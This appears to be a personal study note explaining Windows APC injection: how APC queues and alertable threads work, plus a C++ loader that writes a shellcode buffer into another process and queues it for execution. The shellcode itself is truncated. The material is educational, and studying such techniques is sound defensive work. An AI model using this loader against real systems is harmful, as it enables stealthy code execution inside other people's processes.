APC (Asynchronous Procedure Call) Injection is shellcode injection technique that use the functioning of Windows' APCs.
An APC is a function [**that executes asynchronously in the context of a thread (of a process)**.](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls), regarding official Microsoft documentation.
When a APC is queued into a thread, the system issues a software interrumpt. When the thread enters an '**alertable**' state, the Windows Kernel checks if there are any queued APCs for that thread. If an APC is found in the queue, the kernel suspends the normal execution and it will execute the code/function specified in the APC.
The high-level overview technique is simple:
- Create a shellcode space in the remote process (VirtualAlloc)
- Insert the shellcode into that memory space (WriteProcessMemory)
- Create an APC object pointing to the shellcode (QueueUserAPC) so it is inserted into the APC queue of a remote process.
- After that, we must turn the thread of that process into the  **alertable** state so the APC queue is checked, and our APC routine containing the shellcode is detected by the kernel and executed.

Just as additional information, the Windows threads can be in one of the following states:
> Running — The thread is actively executive code.  
> Waiting — The thread is waiting for some events to occur  
> Blocked — The thread is blocked.  
> Alertable — This is the special state that allows a thread to be waiting for an alert event, which can be triggered using the `QueueUserAPC` function.

And this is the list of functions that make the thread enter the **alertable** state:
![[attachments/apc_injection.png]]

The snippet of code that performs an APC Injection is the following:

```c++
int main() {

	unsigned char payload[] = {
	  0xfc, 0x48, 0x83, ...

	wchar_t process_name[MAX_PATH] = L"PE-bear.exe";
	DWORD pid = 0;
	pid = findMyProc(process_name);
	if (pid == 0) {
		printf("PID not found :( exiting...\n");
		return EXIT_FAILURE;
	}

	HANDLE hThread = getHandleToThread(pid);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	PVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, sizeof(payload), MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProcess, pRemoteCode, payload, sizeof(payload), NULL);

	QueueUserAPC((PAPCFUNC) pRemoteCode, hThread, NULL);

	CloseHandle(hThread);

	return EXIT_SUCCESS;

}
```

Then we would have to turn the thread of the remote process into an alertable state, just by interacting with the remote process, so any of the calls that make that thread alertable is called.